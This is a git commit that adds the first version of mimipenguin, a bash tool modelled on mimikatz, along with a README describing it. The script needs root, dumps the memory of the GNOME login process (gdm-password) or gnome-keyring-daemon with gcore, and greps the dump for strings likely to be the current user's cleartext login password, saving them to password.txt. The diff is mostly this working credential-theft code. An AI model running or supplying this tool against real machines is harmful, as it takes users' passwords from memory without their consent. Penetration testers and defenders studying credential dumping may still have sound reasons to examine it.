8c4fffa283c00367526a42c1804b0821db7a366a
huntergregal <root@test-virtual-machine.(none)>
2017-03-28 17:31:48 -0400

    BETA :fire:

--- README.md
+++ README.md
@@ -1,2 +1,13 @@
 # mimipenguin
-A tool to dump the login password from the current linux user
+A tool to dump the login password from the current linux user. Adapted after the idea behind the popular Windows tool mimikatz.
+
+# Details
+Takes advantage of the gnome login screen feature by dumping the memory of the process and extracting lines that have a high probability of containing the current user's cleartext password.
+
+# Supported/Tested
+* Kali 4.3.0 (rolling) x64
+* Ubuntu 12.04 LTS x64
+
+# Notes
+* Ubuntu support still in testing
+* Plan on expanding support and other credential locations
---
+++ mimipenguin.sh
@@ -0,0 +1,31 @@
+#! /bin/bash
+
+# Author: Hunter Gregal
+# Github: /huntergregal
+# Contribution from pugilist
+# Dumps cleartext credentials from memory
+
+#root check
+if [[ $EUID -ne 0 ]]; then
+	echo "Root required - You are dumping memory..."
+	echo "Evene mimikatz requires administrator"
+	exit 1
+fi
+
+#If Kali
+if [[ `uname -a | awk '{print tolower($0)}'` == *"Kali"* ]]; then
+	#get gdm-session-worker [pam/gdm-password] process
+	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	gcore -o /tmp/dump $PID >& /dev/null
+	strings /tmp/dump.${PID} | egrep '^\$.\$.+$' -B 10 -A 10 > password.txt
+fi
+
+#If Ubuntu
+if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
+	#get /usr/bin/gnome-keyring-daemon process
+	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	gcore -o /tmp/dump $PID >& /dev/null
+	strings /tmp/dump.${PID} | egrep '^/usr/lib/libgck\-1\.so\.0' -B 10 -A 10 > password.txt
+fi
+ 
+echo "Password located somewhere within password.txt"
